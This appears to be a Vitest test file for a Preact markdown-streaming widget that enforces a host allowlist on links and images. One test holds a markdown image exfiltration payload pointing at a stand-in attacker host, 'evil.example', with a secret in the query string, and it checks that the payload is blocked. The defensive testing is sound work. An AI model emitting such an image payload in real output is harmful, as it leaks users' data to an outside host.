import { render } from "preact";
import { afterEach, describe, expect, it, vi } from "vitest";
import { WidgetStreamdown } from ".";

vi.mock("../contexts/text-contents", () => ({
  useTextContents: () => ({ download: { value: "Download" } }),
}));

const linkConfig = {
  allowedHosts: ["example.com"],
  includeWww: true,
  allowHttp: false,
};

describe("WidgetStreamdown", () => {
  const container = document.createElement("div");
  document.body.append(container);

  afterEach(() => render(null, container));

  it("shows the text of a partially streamed link instead of [blocked]", () => {
    for (const partial of [
      "See [docs](https://example.com/pa",
      "See [do",
      "See [https://other.com/page](https://other.com/pa",
      "See [https://exa",
      "See [www.example.com](https://www.exa",
      "See [me@example.com](mailto:me@exa",
    ]) {
      render(
        <WidgetStreamdown linkConfig={linkConfig}>{partial}</WidgetStreamdown>,
        container
      );
      expect(container.textContent).not.toContain("[blocked]");
      expect(container.querySelector("a")).toBeNull();
    }

    render(
      <WidgetStreamdown linkConfig={linkConfig}>
        See [docs](https://example.com/page)
      </WidgetStreamdown>,
      container
    );
    expect(container.querySelector("a")?.getAttribute("href")).toBe(
      "https://example.com/page"
    );
  });

  it("only renders images from allowlisted hosts", () => {
    render(
      <WidgetStreamdown linkConfig={linkConfig}>
        {"![x](https://evil.example/p?d=secret)"}
      </WidgetStreamdown>,
      container
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");

    for (const src of [
      "https://example.com/a.png",
      "https://www.example.com/a.png",
      `${window.location.origin}/a.png`,
      "data:image/png;base64,iVBORw0KGgo=",
    ]) {
      render(
        <WidgetStreamdown
          linkConfig={linkConfig}
        >{`![x](${src})`}</WidgetStreamdown>,
        container
      );
      expect(container.querySelector("img")?.getAttribute("src")).toBe(src);
    }
  });

  it("blocks external images when no hosts are allowlisted", () => {
    render(
      <WidgetStreamdown
        linkConfig={{ allowedHosts: [], includeWww: false, allowHttp: false }}
      >
        {"![x](https://example.com/a.png)"}
      </WidgetStreamdown>,
      container
    );
    expect(container.querySelector("img")).toBeNull();
  });

  it("keeps allowing any image host when the allowlist is a wildcard", () => {
    render(
      <WidgetStreamdown
        linkConfig={{
          allowedHosts: ["*"],
          includeWww: false,
          allowHttp: false,
        }}
      >
        {"![x](https://images.other.example/a.png)"}
      </WidgetStreamdown>,
      container
    );
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "https://images.other.example/a.png"
    );
  });
});
